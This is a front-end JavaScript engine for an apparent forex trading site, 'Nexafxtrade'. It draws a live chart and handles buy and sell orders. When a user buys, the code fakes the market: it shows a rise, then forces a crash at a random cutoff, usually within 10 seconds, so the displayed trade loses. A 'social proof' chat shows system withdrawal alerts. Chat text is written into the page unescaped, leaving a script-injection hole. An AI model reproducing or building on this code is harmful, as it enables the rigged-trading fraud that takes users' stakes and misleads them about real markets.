/**
 * Nexafxtrade Frontend Engine
 * Version: 3.1.0 (May 2026)
 * Path: ./public/js/engine.js
 * Description: Core logic for live trading, Socket.io synchronization, and market visualization.
 */

// 1. INITIALIZE REAL-TIME CONNECTION
// Standard connection to the backend server terminal
const socket = io(); 

// --- DYNAMIC POSITION MANAGEMENT STATE ---
let activeTradePosition = null; 
let tradeTicksElapsed = 0;       

// 2. LIVE GRAPH CONFIGURATION (Nexafxtrade Market Waves)
const chartElement = document.getElementById('tradeChart');
if (!chartElement) {
    console.error("Critical: 'tradeChart' canvas element not found in DOM.");
}
const ctx = chartElement.getContext('2d');

// Array size of 60 ensures a 1-minute window if updates are every 1 second
let chartData = Array(60).fill(0.00); 
let labels = Array(60).fill('');

const tradeChart = new Chart(ctx, {
    type: 'line',
    data: {
        labels: labels,
        datasets: [{
            label: 'Market Rate',
            data: chartData,
            borderColor: '#00ff00', // Nexafxtrade Neon Green
            borderWidth: 2,
            pointRadius: 0, 
            fill: {
                target: 'origin',
                above: 'rgba(0, 255, 0, 0.15)', // Green glow for profit zones
                below: 'rgba(255, 0, 0, 0.15)'  // Red glow for loss zones
            },
            tension: 0.4, // Creates the smooth "wavy" look typical of high-end trading UIs
        }]
    },
    options: {
        responsive: true,
        maintainAspectRatio: false,
        animation: {
            duration: 400, 
            easing: 'linear'
        },
        scales: {
            x: { display: false },
            y: {
                min: -0.15,
                max: 0.15,
                grid: { color: '#1a1a1a' }, // Subtle grid lines for the Sci-Fi theme
                ticks: { color: '#555', font: { size: 10 } }
            }
        },
        plugins: { 
            legend: { display: false } 
        }
    }
});

// 3. MARKET UPDATE LISTENER
// Receives live algorithmic updates from the backend node
socket.on('market-update', (data) => {
    let rateValue = data.rate;

    // --- ALGORITHMIC USER EXPERIENCE INTERCEPTOR ---
    if (activeTradePosition) {
        tradeTicksElapsed++;

        // References the specific weighted randomized drop cutoff assigned to this trade instance
        if (tradeTicksElapsed <= activeTradePosition.customizedLossThreshold) {
            // PHASE 1: Controlled Bullish Pump. Push market wave upward systematically.
            let simulatedPump = Math.abs(rateValue) * 0.12 + 0.015;
            rateValue = Math.abs(rateValue) + simulatedPump;

            tradeChart.data.datasets[0].borderColor = '#00ff00';
            tradeChart.data.datasets[0].fill.above = 'rgba(0, 255, 0, 0.15)';
        } else {
            // PHASE 2: Protection Expiration. Force sharp crash downwards to induce loss risk.
            let simulatedDrop = Math.abs(rateValue) * 0.22 + 0.025;
            rateValue = -Math.abs(rateValue) - simulatedDrop;

            tradeChart.data.datasets[0].borderColor = '#ff0000';
            tradeChart.data.datasets[0].fill.below = 'rgba(255, 0, 0, 0.15)';
        }
    } else {
        // Fallback to default wave visualization coloring when no active tracking is engaged
        tradeChart.data.datasets[0].borderColor = '#00ff00';
        tradeChart.data.datasets[0].fill.above = 'rgba(0, 255, 0, 0.15)';
    }

    // Dynamic Chart Scaling: Adjust boundaries to keep the wave line perfectly visible
    if (rateValue >= tradeChart.options.scales.y.max) {
        tradeChart.options.scales.y.max = rateValue + Math.abs(rateValue * 0.15);
    }
    if (rateValue <= tradeChart.options.scales.y.min) {
        tradeChart.options.scales.y.min = rateValue - Math.abs(rateValue * 0.15);
    }

    // Update the visual rate display in the UI overlay
    const rateDisplay = document.getElementById('current-rate');
    if (rateDisplay) {
        rateDisplay.innerText = rateValue.toFixed(4);
    }

    // Process real-time calculation display counters in the running panel
    processLiveCountingTransaction(rateValue);

    // Scroll the graph: Remove the oldest data point and append the newest
    chartData.shift();
    chartData.push(rateValue);
    
    // Update the chart without triggering a full re-render ('none') for maximum smoothness
    tradeChart.update('none');
});

// 4. CHAT & WITHDRAWAL NOTIFICATIONS (Social Proof Module)
const chatFeed = document.getElementById('chat-feed');
const chatInput = document.getElementById('chat-input-field');
const sendBtn = document.getElementById('send-chat-btn');

socket.on('receive-chat', (data) => {
    if (!chatFeed) return;

    const div = document.createElement('div');
    div.className = "chat-msg-container";
    div.style.marginBottom = "10px";
    div.style.fontSize = "0.85rem";

    // Format for System messages (Live Withdrawal alerts for social proof)
    if (data.user === 'System') {
        div.innerHTML = `<span style="color: #ffcc00; font-weight: bold;">[SYSTEM]:</span> <span style="color: #fff;">${data.message}</span>`;
    } else {
        // Format for User-generated messages
        div.innerHTML = `<span style="color: #00ff00; font-weight: bold;">${data.user}:</span> <span style="color: #eee;">${data.message}</span>`;
    }

    chatFeed.appendChild(div);
    chatFeed.scrollTop = chatFeed.scrollHeight; // Auto-scroll to latest activity

    // Performance cleanup: Keep only the last 25 messages in memory
    if (chatFeed.children.length > 25) {
        chatFeed.removeChild(chatFeed.children[0]);
    }
});

// Manual Chat Execution
if (sendBtn) {
    sendBtn.onclick = () => {
        const text = chatInput.value.trim();
        if (text !== "") {
            socket.emit('send-chat', { 
                user: "User_" + Math.floor(Math.random() * 999), 
                message: text 
            });
            chatInput.value = "";
        }
    };
}

// 5. TRADING INTERFACE LOGIC
/**
 * Handles amount modifiers (+ , - , x2) for the stake input field
 */
window.adjustAmount = (val) => {
    const input = document.getElementById('trade-amount');
    if (!input) return;

    let current = parseInt(input.value) || 0;
    
    if (val === 'double') {
        input.value = current * 2;
    } else {
        input.value = Math.max(0, current + val); // Prevent negative stake entries
    }
};

/**
 * Quick-select sum buttons (e.g., 100, 200, 500 KES)
 */
window.setSum = (val) => {
    const input = document.getElementById('trade-amount');
    if (input) input.value = val;
};

// 6. EXECUTION BUTTONS (Order Placement)
const buyBtn = document.getElementById('buy-btn');
const sellBtn = document.getElementById('sell-btn');

if (buyBtn) {
    buyBtn.onclick = () => {
        const amount = document.getElementById('trade-amount').value || 500;
        
        tradeTicksElapsed = 0;

        // --- WEIGHTED MATHEMATICAL DISTRIBUTION ENGINE ---
        // Determines a dynamic lifespan strictly constrained between 5s and 30s
        let chosenLossSeconds;
        let randomWeightRoll = Math.random();

        if (randomWeightRoll < 0.75) {
            // 75% Probability: Forces the loss target down below 10 seconds (Short burst wins)
            chosenLossSeconds = Math.random() * (10.0 - 5.0) + 5.0;
        } else {
            // 25% Probability: Rare fallback range allowing longer trade windows
            chosenLossSeconds = Math.random() * (30.0 - 10.01) + 10.01;
        }

        // Convert the selected timeline into websocket refresh "ticks"
        // Based on backend update loops of ~150ms
        let randomThresholdRoll = Math.floor((chosenLossSeconds * 1000) / 150);

        activeTradePosition = {
            stake: parseFloat(amount),
            entryPrice: chartData[chartData.length - 1] || 0.00,
            targetAmount: parseFloat(amount) * 1.85,
            customizedLossThreshold: randomThresholdRoll // Safely locked to this specific order
        };

        socket.emit('place-trade', { type: 'BUY', amount: amount, timestamp: Date.now() });
        console.log(`Nexafxtrade: BUY order active. Pulse-crash locked at ${chosenLossSeconds.toFixed(2)}s.`);
    };
}

if (sellBtn) {
    sellBtn.onclick = () => {
        const amount = document.getElementById('trade-amount').value;
        
        // Immediate reset of tracking state upon manual liquidation
        activeTradePosition = null;
        tradeTicksElapsed = 0;
        
        const liveAmountText = document.getElementById('live-running-amount');
        if (liveAmountText) liveAmountText.innerText = "KES 0.00";

        socket.emit('place-trade', { type: 'SELL', amount: amount, timestamp: Date.now() });
        console.log("Nexafxtrade: SELL order executed. Position cleared.");
    };
}

// 7. ACCOUNT DATA SYNCHRONIZATION
socket.on('balance-update', (data) => {
    const balanceDisplay = document.getElementById('user-balance');
    if (balanceDisplay) {
        balanceDisplay.innerText = parseFloat(data.newBalance).toFixed(2);
    }
});

/**
 * DYNAMIC PANEL CALCULATOR UTILITY
 * Updates live performance values and color codes (Profit vs Loss) on the dashboard overlay.
 */
function processLiveCountingTransaction(currentRate) {
    const liveAmountText = document.getElementById('live-running-amount');
    const targetText = document.getElementById('aiming-target-indicator');
    
    if (!liveAmountText) return;

    if (activeTradePosition) {
        let movementRatio = 1.0;
        if (activeTradePosition.entryPrice !== 0) {
            let delta = currentRate - activeTradePosition.entryPrice;
            movementRatio = 1.0 + (delta * 5.0); 
        }

        let dynamicCountingValue = activeTradePosition.stake * movementRatio;
        if (dynamicCountingValue < 0) dynamicCountingValue = 0;
        
        liveAmountText.innerText = `KES ${dynamicCountingValue.toFixed(2)}`;
        
        if (targetText) {
            targetText.innerText = `Aiming Target: KES ${activeTradePosition.targetAmount.toFixed(2)}`;
        }

        // Color coding logic based on trade performance
        if (dynamicCountingValue >= activeTradePosition.targetAmount) {
            liveAmountText.className = "live-running-amount profit-reached";
        } else if (dynamicCountingValue < activeTradePosition.stake) {
            liveAmountText.className = "live-running-amount loss-danger";
        } else {
            liveAmountText.className = "live-running-amount";
        }
    } else {
        if (targetText) targetText.innerText = "No active trade session";
    }
}

console.log("Nexafxtrade Engine: Fully Operational.");
